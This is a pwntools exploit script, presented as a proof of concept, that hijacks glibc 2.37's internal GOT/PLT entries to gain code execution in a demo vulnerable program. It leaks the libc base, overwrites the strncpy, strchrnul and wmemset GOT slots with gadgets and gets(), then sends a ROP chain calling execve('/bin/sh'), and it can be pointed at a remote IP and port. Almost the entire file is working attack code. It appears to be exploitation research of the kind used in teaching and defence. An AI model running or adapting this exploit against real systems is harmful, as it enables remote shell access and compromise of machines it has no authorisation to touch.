# Title       : PoC for Hijacking glibc internal GOT/PLT to RCE
# Author      : Axura
# Target      : GLIBC 2.37-0ubuntu2.2 (Ubuntu 23.04)
# Website     : https://4xura.com/pwn/pwn-got-hijack-libcs-internal-got-plt-as-rce-primitives/
# Vuln script : https://github.com/4xura/pwn-libc-got/blob/main/demo/vuln.c
# Tags        : PLT0, GOT0, writable _GLOBAL_OFFSET_TABLE_, ROP, Direct GOT call, j_strncpy, j_wmemset_0


import sys
import inspect
from pwn import *


s       = lambda data                 :p.send(data)
sa      = lambda delim,data           :p.sendafter(delim, data)
sl      = lambda data                 :p.sendline(data)
sla     = lambda delim,data           :p.sendlineafter(delim, data)
r       = lambda num=4096             :p.recv(num)
ru      = lambda delim, drop=True     :p.recvuntil(delim, drop)
l64     = lambda                      :u64(p.recvuntil(b"\x7f")[-6:].ljust(8,b"\x00"))
uu64    = lambda data                 :u64(data.ljust(8, b"\0"))


def g(gdbscript: str = ""):
    if mode["local"]:
        gdb.attach(p, gdbscript=gdbscript)
        
    elif mode["remote"]:
        gdb.attach((remote_ip_addr, remote_port), gdbscript)
        if gdbscript == "":
            raw_input()


def pa(addr: int) -> None:
    frame = inspect.currentframe().f_back
    variables = {k: v for k, v in frame.f_locals.items() if v is addr}
    desc = next(iter(variables.keys()), "unknown")
    success(f"[LEAK] {desc} ---> {addr:#x}")


class ROPGadgets:
    def __init__(self, libc: ELF): 
        self.rop = ROP(libc)
        self.addr = lambda x: self.rop.find_gadget(x)[0] if self.rop.find_gadget(x) else None

        self.ggs = {
            'p_rdi_r'       : self.addr(['pop rdi', 'ret']),
            'p_rsi_r'       : self.addr(['pop rsi', 'ret']),
            'p_rdx_rbx_r'   : self.addr(['pop rdx', 'pop rbx', 'ret']),
            'p_r15_r'       : self.addr(['pop r15', 'ret']),
            'p_rax_r'       : self.addr(['pop rax', 'ret']),
            'p_rsp_r'       : self.addr(['pop rsp', 'ret']),
            'leave_r'       : self.addr(['leave', 'ret']),
            'ret'           : self.addr(['ret']),
            'syscall_r'     : self.addr(['syscall', 'ret']),
        }

    def __getitem__(self, k: str) -> int:
        return self.ggs.get(k)


def hijack_got(libc: ELF) -> (int, bytes):
    global STRNCPY_GOT_OFFSET
    global STRCHRNUL_GOT_OFFSET
    global WMEMSET_GOT_OFFSET

    got0 = libc.address + libc.dynamic_value_by_tag("DT_PLTGOT")
    plt0 = libc.address + libc.get_section_by_name(".plt").header.sh_addr
    strncpy_got = got0 + STRNCPY_GOT_OFFSET
    strchrnul_got = got0 + STRCHRNUL_GOT_OFFSET
    wmemset_got = got0 + WMEMSET_GOT_OFFSET
    gets_addr = libc.sym.gets
    pa(got0)
    pa(plt0)
    pa(strncpy_got)
    pa(strchrnul_got)
    pa(wmemset_got)
    pa(gets_addr)

    # GOT order: strncpy -> strchrnul -> wmemset
    write_dest = strncpy_got

    """
    # Overwrite strchnul@got with:
    .text:000000000016A288 lea     rdi, [rsp+0x18]
    .text:000000000016A28D mov     edx, 20h ; ' '
    .text:000000000016A292 call    j_strncpy

    # Overwrite strncpy@got with:
    .text:00000000000CD548 pop     rbx
    .text:00000000000CD549 pop     rbp
    .text:00000000000CD54A pop     r12
    .text:00000000000CD54C pop     r13
    .text:00000000000CD54E jmp     j_wmemset_0

    # Overwrite wmemset@got with gets()
    """

    gg1 = libc.address + 0x16a288
    gg2 = libc.address + 0xcd548

    write_data = flat({
        0x0: gg2,
        STRCHRNUL_GOT_OFFSET - STRNCPY_GOT_OFFSET: gg1,
        WMEMSET_GOT_OFFSET - STRNCPY_GOT_OFFSET: gets_addr,
        })

    return write_dest, write_data


def exp():
    """
    11ee:       e8 5d fe ff ff          call   1050 <printf@plt>
    """
    g("breakrva 0x11ee")

    leak = int(ru(b"\n"), 16)
    libc_base = leak - libc.sym.printf
    pa(libc_base)
    libc.address = libc_base

    ggs = ROPGadgets(libc)
    p_rdi_r = ggs["p_rdi_r"]
    p_rsi_r = ggs["p_rsi_r"]
    p_rdx_rbx_r = ggs["p_rdx_rbx_r"]

    rop_chain = flat(
            p_rdi_r,
            libc.search(b"/bin/sh\x00").__next__(),
            p_rsi_r,
            0,
            p_rdx_rbx_r,
            0, 0,
            libc.sym.execve,
            )

    pivot = ggs["p_rsp_r"]
    jump = ggs["p_r15_r"]

    write_dest, write_data = hijack_got(libc)

    s(p64(write_dest))
    s(p64(len(write_data)))
    s(write_data)

    success("Payload written to: {}\nPayload length: {}".format(hex(write_dest), hex(len(write_data))))

    log.info("Send ROP gadgets chain:\n")
    sl(rop_chain)

    # pause()
    p.interactive()


if __name__ == '__main__':
    """pwndbg> tel &_GLOBAL_OFFSET_TABLE_ 60
    08:0040│  0x71427033f028 (*ABS*@got.plt) —▸ 0x7142701f66d0 (__wmemset_sse2_unaligned) ◂— endbr64
    12:0090│  0x7ffff7fac078 (*ABS*@got.plt) —▸ 0x7ffff7f2b780 (__strncpy_avx2) ◂— endbr64
    18:00c0│  0x7ffff7fac0a8 (*ABS*@got.plt) —▸ 0x7ffff7f296a0 (__strchrnul_avx2) ◂— endbr64
    1c:00e0│  0x7ffff7fac0c8 (*ABS*@got.plt) —▸ 0x7ffff7e636d0 (__wmemset_sse2_unaligned) ◂— endbr64"""
    STRNCPY_GOT_OFFSET = 0x90
    STRCHRNUL_GOT_OFFSET = 0xc0
    WMEMSET_GOT_OFFSET = 0xe0


    FILE_PATH = "./vuln"
    LIBC_PATH = "/usr/lib/x86_64-linux-gnu/libc.so.6"

    context(arch="amd64", os="linux", endian="little")
    context.log_level = "debug"
    context.terminal  = ['tmux', 'splitw', '-h']    # ['<terminal_emulator>', '-e', ...]

    e    = ELF(FILE_PATH, checksec=False)
    mode = {"local": False, "remote": False, }
    env  = None

    print("Usage: python3 xpl.py [<ip> <port>]\n"
                "  - If no arguments are provided, runs in local mode (default).\n"
                "  - Provide <ip> and <port> to target a remote host.\n")

    if len(sys.argv) == 3:
        if LIBC_PATH:
            libc = ELF(LIBC_PATH)
        p = remote(sys.argv[1], int(sys.argv[2]))
        mode["remote"] = True
        remote_ip_addr = sys.argv[1]
        remote_port    = int(sys.argv[2])
        
    elif len(sys.argv) == 1:
        if LIBC_PATH:
            libc = ELF(LIBC_PATH)
            env = {
                "LD_PRELOAD": os.path.abspath(LIBC_PATH),
                "LD_LIBRARY_PATH": os.path.dirname(os.path.abspath(LIBC_PATH))
            }
        p   = process(FILE_PATH, env=env)
        mode["local"] = True
    else:
        print("[-] Error: Invalid arguments provided.")
        sys.exit(1)

    exp()
